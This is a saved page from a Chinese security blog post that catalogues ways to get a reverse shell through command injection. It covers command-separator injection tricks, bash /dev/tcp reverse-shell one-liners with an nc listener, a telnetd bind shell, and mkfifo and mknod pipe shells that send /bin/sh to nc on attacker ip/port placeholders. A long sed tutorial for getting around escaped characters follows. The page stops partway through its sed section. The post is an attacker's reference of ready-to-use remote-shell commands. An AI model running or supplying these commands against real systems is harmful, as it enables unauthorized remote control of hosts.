@@ -1,0 +1,349 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>ixout's blog | ixout's blog</title><meta name="author" content="ixout"><meta name="copyright" content="ixout"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="记录一下常见的通过命令注入反弹shell的操作 命令分割命令注入有许多方法常见有  &#96;&#96; $() \n ; &amp; |  其中&#96;与$()的优先级最高,哪怕被”包裹依然能够执行,但无法绕过’包裹只能通过闭合包裹完成注入 bashbash有一个特性可以通过&#x2F;dev&#x2F;tcp获得shell的方式 我们只需要在攻击端上监听一个端口(本质上就是建立一个tcp服务器等待连接) nc -lvnp 6678 利">
+<meta property="og:type" content="website">
+<meta property="og:title" content="ixout&#39;s blog">
+<meta property="og:url" content="https://ixout.github.io/only_iot/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%8F%8D%E5%BC%B9shell.html">
+<meta property="og:site_name" content="ixout&#39;s blog">
+<meta property="og:description" content="记录一下常见的通过命令注入反弹shell的操作 命令分割命令注入有许多方法常见有  &#96;&#96; $() \n ; &amp; |  其中&#96;与$()的优先级最高,哪怕被”包裹依然能够执行,但无法绕过’包裹只能通过闭合包裹完成注入 bashbash有一个特性可以通过&#x2F;dev&#x2F;tcp获得shell的方式 我们只需要在攻击端上监听一个端口(本质上就是建立一个tcp服务器等待连接) nc -lvnp 6678 利">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/indeximg.jpg">
+<meta property="article:published_time" content="2024-09-11T06:34:15.943Z">
+<meta property="article:modified_time" content="2024-09-11T06:34:15.943Z">
+<meta property="article:author" content="ixout">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/indeximg.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://ixout.github.io/only_iot/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%8F%8D%E5%BC%B9shell.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: true,
+  islazyload: true,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ixout\'s blog',
+  isPost: false,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2024-09-11 14:34:15'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/universe.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/mainColor/heoMainColor.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/poem/poem.css"><link rel="stylesheet" href="/css/footerb.css"><link rel="stylesheet" href="/css/bolang.css"><link rel="stylesheet" href="/css/jzbar.css"><link rel="stylesheet" href="/css/trans.css"><link rel="stylesheet" href="/css/gundongtiao.css"><link rel="stylesheet" href="/css/shubiao.css"><link rel="stylesheet" href="/css/fengche.css"><link rel="stylesheet" href="/css/alitubiao.css"><link rel="stylesheet" href="/css/fps.css"><span id="fps"></span><link rel="stylesheet" href="/css/yituliu.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="//at.alicdn.com/t/c/font_3930344_38rvofbfw64.css" media="defer" onload="this.media='all'"><svg aria-hidden="true" style="position:absolute; overflow:hidden; width:0; height:0"><symbol id="icon-sun" viewBox="0 0 1024 1024"><path d="M960 512l-128 128v192h-192l-128 128-128-128H192v-192l-128-128 128-128V192h192l128-128 128 128h192v192z" fill="#FFD878" p-id="8420"></path><path d="M736 512a224 224 0 1 0-448 0 224 224 0 1 0 448 0z" fill="#FFE4A9" p-id="8421"></path><path d="M512 109.248L626.752 224H800v173.248L914.752 512 800 626.752V800h-173.248L512 914.752 397.248 800H224v-173.248L109.248 512 224 397.248V224h173.248L512 109.248M512 64l-128 128H192v192l-128 128 128 128v192h192l128 128 128-128h192v-192l128-128-128-128V192h-192l-128-128z" fill="#4D5152" p-id="8422"></path><path d="M512 320c105.888 0 192 86.112 192 192s-86.112 192-192 192-192-86.112-192-192 86.112-192 192-192m0-32a224 224 0 1 0 0 448 224 224 0 0 0 0-448z" fill="#4D5152" p-id="8423"></path></symbol><symbol id="icon-moon" viewBox="0 0 1024 1024"><path d="M611.370667 167.082667a445.013333 445.013333 0 0 1-38.4 161.834666 477.824 477.824 0 0 1-244.736 244.394667 445.141333 445.141333 0 0 1-161.109334 38.058667 85.077333 85.077333 0 0 0-65.066666 135.722666A462.08 462.08 0 1 0 747.093333 102.058667a85.077333 85.077333 0 0 0-135.722666 65.024z" fill="#FFB531" p-id="11345"></path><path d="M329.728 274.133333l35.157333-35.157333a21.333333 21.333333 0 1 0-30.165333-30.165333l-35.157333 35.157333-35.114667-35.157333a21.333333 21.333333 0 0 0-30.165333 30.165333l35.114666 35.157333-35.114666 35.157334a21.333333 21.333333 0 1 0 30.165333 30.165333l35.114667-35.157333 35.157333 35.157333a21.333333 21.333333 0 1 0 30.165333-30.165333z" fill="#030835" p-id="11346"></path></symbol></svg><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ixout's blog" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="pokeball-back"></div><div class="pokeball-loading"><div class="pokeball" id="pokeball-normal"></div><div class="pokeball" id="pokeball-great"></div><div class="pokeball" id="pokeball-ultra"></div><div class="pokeball" id="pokeball-master"></div><div class="pokeball" id="pokeball-safari"></div></div></div><script async="async">const preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+document.getElementById('loading-box').addEventListener('click',()=> {preloader.endLoading()})
+setTimeout(function(){preloader.endLoading();}, 7000);
+
+if (false) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="/css/jzbar.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/touxiang.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">58</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">64</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-hanbao"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-fenlei"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-youlian"></i><span> 友人帐</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-fantuan"></i><span> About</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="not-home-page" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="ixout's blog"><span class="site-name">ixout's blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-hanbao"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-fenlei"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-youlian"></i><span> 友人帐</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-fantuan"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="page-site-info"><h1 id="site-title">ixout's blog</h1></div></header><main class="layout" id="content-inner"><div id="page"><div id="article-container"><p>记录一下常见的通过命令注入反弹shell的操作</p>
+<h1 id="命令分割"><a href="#命令分割" class="headerlink" title="命令分割"></a>命令分割</h1><p>命令注入有许多方法常见有</p>
+<ul>
+<li>``</li>
+<li>$()</li>
+<li>\n</li>
+<li>;</li>
+<li>&amp;</li>
+<li>|</li>
+</ul>
+<p>其中`与$()的优先级最高,哪怕被”包裹依然能够执行,但无法绕过’包裹<br>只能通过闭合包裹完成注入</p>
+<h1 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h1><p>bash有一个特性可以通过<code>/dev/tcp</code>获得shell的方式</p>
+<p>我们只需要在攻击端上监听一个端口(本质上就是建立一个tcp服务器等待连接)</p>
+<p><code>nc -lvnp 6678</code></p>
+<p>利用bash创建socket的特性,然后再在被攻击端执行</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bash -i &amp;&gt; /dev/tcp/ip/port 0&gt;&amp;1</span><br><span class="line">bash -i &amp;&gt; /dev/tcp/ip/port 0&gt;&amp;2</span><br><span class="line"><span class="comment"># 如果使用system执行以上命令的话，需要改成如下形式</span></span><br><span class="line">bash -c <span class="string">&quot;bash -i &amp;&gt; /dev/tcp/ip/port 0&gt;&amp;1&quot;</span></span><br><span class="line">bash -c <span class="string">&quot;bash -i &amp;&gt; /dev/tcp/ip/port 0&gt;&amp;2&quot;</span></span><br></pre></td></tr></table></figure>
+<p><code>bash -i</code> ：创建一个交互式shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;&gt;` ：将stdout和stderr都重定向到stdout。`&gt;&amp;`跟它的功能一样，当使用`&gt;&amp; file`或`&amp;&gt; file`时，等同于`&gt; file 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p><code>/dev/tcp/ip/port</code> ：利用bash的特性，创建一个socket连接</p>
+<p><code>0&gt;&amp;1</code> ：将stdin重定向给stdout</p>
+<p><code>0&gt;&amp;2</code> ：将stdin重定向给stderr</p>
+<p><code>bash -c &quot;command&quot;</code> ：创建一个子shell环境运行command</p>
+<p>现在攻击端就获得了一个shell</p>
+<h1 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h1><p>如果目标存在telnetd服务的话,可以直接利用telnetd</p>
+<p><code>telnetd -l /bin/sh -p 55557</code></p>
+<h1 id="mkfifo"><a href="#mkfifo" class="headerlink" title="mkfifo"></a>mkfifo</h1><p><code>mkfifo</code> 是一个专门用于创建命名管道（FIFO）的命令。它的语法相对简单，因为它仅用于创建一种类型的文件。</p>
+<p>命名管道（Named Pipe），又称为FIFO（First In, First Out），是一种特殊类型的文件，它允许两个进程进行通信。与匿名管道不同，命名管道可以在系统的文件系统中创建，并具有路径名。</p>
+<p><strong>示例</strong></p>
+<p>以下是一个简单的示例，演示如何使用命名管道进行进程间通信。</p>
+<p><strong>终端</strong>1：写入数据</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkfifo</span> /tmp/myfifo</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Hello from Terminal 1&quot;</span> &gt; /tmp/myfifo</span><br></pre></td></tr></table></figure>
+<p><strong>终端</strong>2：读取数据</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /tmp/myfifo</span><br></pre></td></tr></table></figure>
+<p>终端2将会显示“Hello from Terminal 1”。</p>
+<p>通过mkfifo反弹shell</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> /tmp/f</span><br><span class="line"><span class="built_in">mkfifo</span> /tmp/f</span><br><span class="line"><span class="built_in">cat</span> /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f</span><br></pre></td></tr></table></figure>
+<p>前两句好理解,第三句可能有些难以理解</p>
+<p><strong>命令分解与解释</strong></p>
+<ol>
+<li><strong><code>cat /tmp/f</code></strong>：<ul>
+<li>这个部分读取命名管道 <code>/tmp/f</code> 的内容。因为这是一个命名管道，命令会阻塞，直到有数据写入管道。</li>
+</ul>
+</li>
+<li><strong><code>| /bin/sh -i</code></strong>：<ul>
+<li>管道符号 <code>|</code> 将前一个命令的输出（从 <code>/tmp/f</code> 读取的数据）传递给后一个命令作为输入。</li>
+<li><code>/bin/sh -i</code> 启动一个交互式的Shell。<code>-i</code> 标志表示Shell是交互式的，允许输入和输出命令。</li>
+</ul>
+</li>
+<li><strong><code>2&gt;&amp;1</code></strong>：<ul>
+<li>这部分将Shell的标准错误输出（文件描述符2）重定向到标准输出（文件描述符1）。这意味着所有的错误消息和正常输出都将通过相同的管道传输。</li>
+</ul>
+</li>
+<li><strong><code>| nc ip port</code></strong>：<ul>
+<li>再次使用管道符号 <code>|</code>，将Shell的输出传递给 <code>nc</code> 命令。</li>
+<li><code>nc</code>（Netcat）是一个用于读写网络连接的工具。在这里，它被用来连接到指定的IP地址和端口。</li>
+<li><code>ip</code> 和 <code>port</code> 是占位符，分别表示攻击者的IP地址和端口号。</li>
+</ul>
+</li>
+<li><code>&gt;/tmp/f</code>:<ul>
+<li>最后又将nc得到的返回字符串写入<code>/tmp/f</code>做到了一个完美循环,即目标发送的字符被当作命令执行,命令执行的结果又会发送到目标</li>
+</ul>
+</li>
+</ol>
+<h1 id="mknod"><a href="#mknod" class="headerlink" title="mknod"></a>mknod</h1><p>mknod包括mkfifo的功能</p>
+<p><code>mknod</code> 用于创建各种类型的特殊文件，包括设备文件和命名管道（FIFO）。其语法较为复杂，因为它可以创建不同类型的文件。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mknod</span> [OPTION]... NAME TYPE [MAJOR MINOR]</span><br></pre></td></tr></table></figure>
+<p><strong>NAME</strong>：要创建的文件名。</p>
+<p><strong>TYPE</strong>：文件类型，可以是 <code>b</code>（块设备）、<code>c</code>（字符设备）或 <code>p</code>（命名管道）。</p>
+<p><strong>MAJOR MINOR</strong>（仅在创建设备文件时使用）：指定设备的主、次设备号。</p>
+<p>以下代码具有与mkfifo获取反弹shell相同的效果</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> /tmp/f</span><br><span class="line"><span class="built_in">mknod</span> /tmp/f p</span><br><span class="line"><span class="built_in">cat</span> /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f</span><br></pre></td></tr></table></figure>
+<h1 id="sed的妙用"><a href="#sed的妙用" class="headerlink" title="sed的妙用"></a>sed的妙用</h1><p>一些情况下,某些字符会用反斜杠转义,这就导致命令注入无法很好的运行</p>
+<p>这时候可以使用sed来帮助我们</p>
+<p><code>sed</code> 是一个强大的流编辑器，用于处理和转换文本数据。它通常用于在 Unix/Linux 环境下执行各种文本操作，如查找和替换、删除和插入行、文本格式化等。<code>sed</code> 可以处理文件中的文本流，并将修改后的文本输出到标准输出或文件。</p>
+<h2 id="sed-的基本用法"><a href="#sed-的基本用法" class="headerlink" title="sed 的基本用法"></a><code>sed</code> 的基本用法</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed [-hnV][-e&lt;script&gt;][-f&lt;script文件&gt;][文本文件]</span><br></pre></td></tr></table></figure>
+<p><strong>参数说明</strong>：</p>
+<ul>
+<li>-e\<script>或—expression=\<script> 以选项中指定的script来处理输入的文本文件。</li>
+<li>-f<script文件>或—file=<script文件> 以选项中指定的script文件来处理输入的文本文件。</li>
+<li>-h或—help 显示帮助。</li>
+<li>-n或—quiet或—silent 仅显示script处理后的结果。</li>
+<li>-V或—version 显示版本信息。</li>
+<li>-i,表示直接在文件中编辑（in-place），不创建临时文件。如果不使用 <code>-i</code>，则 <code>sed</code> 会将结果输出到标准输出（例如终端），而不会修改原文件。</li>
+</ul>
+<p><strong>动作说明</strong>：</p>
+<ul>
+<li>a ：新增， a 的后面可以接字串，而这些字串会在新的一行出现(目前的下一行)～</li>
+<li>c ：取代， c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行！</li>
+<li>d ：删除，因为是删除啊，所以 d 后面通常不接任何东东；</li>
+<li>i ：插入， i 的后面可以接字串，而这些字串会在新的一行出现(目前的上一行)；</li>
+<li>p ：打印，亦即将某个选择的数据印出。通常 p 会与参数 sed -n一起运行</li>
+<li>s ：取代,可以搭配正则表达式,例如 1,20s/old/new/g 就是啦！</li>
+</ul>
+<h3 id="a-Append（追加）"><a href="#a-Append（追加）" class="headerlink" title="a - Append（追加）"></a><code>a</code> - Append（追加）</h3><p><strong>功能</strong>：在指定的行后面追加文本。</p>
+<p><strong>用法</strong>：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed <span class="string">&#x27;/pattern/a\new line of text&#x27;</span> filename</span><br></pre></td></tr></table></figure>
+<p><strong>示例</strong>：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;line 1\nline 2\nline 3&quot;</span> | sed <span class="string">&#x27;/line 2/a\This is an appended line&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><strong>输出</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">line 1</span><br><span class="line">line 2</span><br><span class="line">This is an appended line</span><br><span class="line">line 3</span><br></pre></td></tr></table></figure>
+<h3 id="c-Change（替换）"><a href="#c-Change（替换）" class="headerlink" title="c - Change（替换）"></a><code>c</code> - Change（替换）</h3><p><strong>功能</strong>：替换指定行的文本。</p>
+<p><strong>用法</strong>：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed <span class="string">&#x27;/pattern/c\new line of text&#x27;</span> filename</span><br></pre></td></tr></table></figure>
+<p><strong>示例</strong>：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;line 1\nline 2\nline 3&quot;</span> | sed <span class="string">&#x27;/line 2/c\This line is changed&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><strong>输出</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">line 1</span><br><span class="line">This line is changed</span><br><span class="line">line 3</span><br></pre></td></tr></table></figure>
+<h3 id="d-Delete（删除）"><a href="#d-Delete（删除）" class="headerlink" title="d - Delete（删除）"></a><code>d</code> - Delete（删除）</h3><p><strong>功能</strong>：删除指定的行。</p>
+<p><strong>用法</strong>：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed <span class="string">&#x27;/pattern/d&#x27;</span> filename</span><br></pre></td></tr></table></figure>
+<p><strong>示例</strong>：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;line 1\nline 2\nline 3&quot;</span> | sed <span class="string">&#x27;/line 2/d&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><strong>输出</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">line 1</span><br><span class="line">line 3</span><br></pre></td></tr></table></figure>
+<h3 id="i-Insert（插入）"><a href="#i-Insert（插入）" class="headerlink" title="i - Insert（插入）"></a><code>i</code> - Insert（插入）</h3><p><strong>功能</strong>：在指定的行前面插入文本。</p>
+<p><strong>用法</strong>：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed <span class="string">&#x27;/pattern/i\new line of text&#x27;</span> filename</span><br></pre></td></tr></table></figure>
+<p><strong>示例</strong>：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;line 1\nline 2\nline 3&quot;</span> | sed <span class="string">&#x27;/line 2/i\This is an inserted line&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><strong>输出</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">line 1</span><br><span class="line">This is an inserted line</span><br><span class="line">line 2</span><br><span class="line">line 3</span><br></pre></td></tr></table></figure>
+<h3 id="p-Print（打印）"><a href="#p-Print（打印）" class="headerlink" title="p - Print（打印）"></a><code>p</code> - Print（打印）</h3><p><strong>功能</strong>：打印指定的行。常与 <code>-n</code> 选项一起使用，以抑制默认输出。</p>
+<p><strong>用法</strong>：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -n <span class="string">&#x27;/pattern/p&#x27;</span> filename</span><br></pre></td></tr></table></figure>
+<p><strong>示例</strong>：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;line 1\nline 2\nline 3&quot;</span> | sed -n <span class="string">&#x27;/line 2/p&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><strong>输出</strong>：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">line 2</span><br></pre></td></tr></table></figure>
+<h3 id="s-Substitute（替换）"><a href="#s-Substitute（替换）" class="headerlink" title="s - Substitute（替换）"></a><code>s</code> - Substitute（替换）</h3><p><strong>功能</strong>：替换匹配的文本。基本格式为 <code>s/pattern/replacement/flags</code>。</p>
+<p><strong>用法</strong>：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed <span class="string">&#x27;s/pattern/replacement/flags&#x27;</span> filename</span><br></pre></td></tr></table></figure>
+<p><strong>常用标志</strong>：</p>
+<ul>
+<li><code>g</code>：全局替换，即替换所有匹配项，而不是只替换第一个。</li>
+<li><code>i</code>：忽略大小写。</li>
+<li><code>n</code>：替换第 <code>n</code> 个匹配项。</li>
+</ul>
+<p><strong>示例</strong>：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;line 1\nline 2\nline 3&quot;</span> | sed <span class="string">&#x27;s/line/LINE/&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><strong>输出</strong>：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LINE 1</span><br><span class="line">LINE 2</span><br><span class="line">LINE 3</span><br></pre></td></tr></table></figure>
+<p><strong>示例</strong>：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;line line\nline 2\nline 3&quot;</span> | sed <span class="string">&#x27;s/line/LINE/g&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><strong>输出</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LINE LINE</span><br><span class="line">LINE 2</span><br><span class="line">LINE 3</span><br></pre></td></tr></table></figure>
+<h3 id="分隔符"><a href="#分隔符" class="headerlink" title="分隔符"></a>分隔符</h3><p>在 <code>sed</code> 命令中，斜杠 <code>/</code> 是默认的分隔符，用于分隔搜索模式和替换字符串,以上例子都是使用<code>/</code>作为分割符号</p>
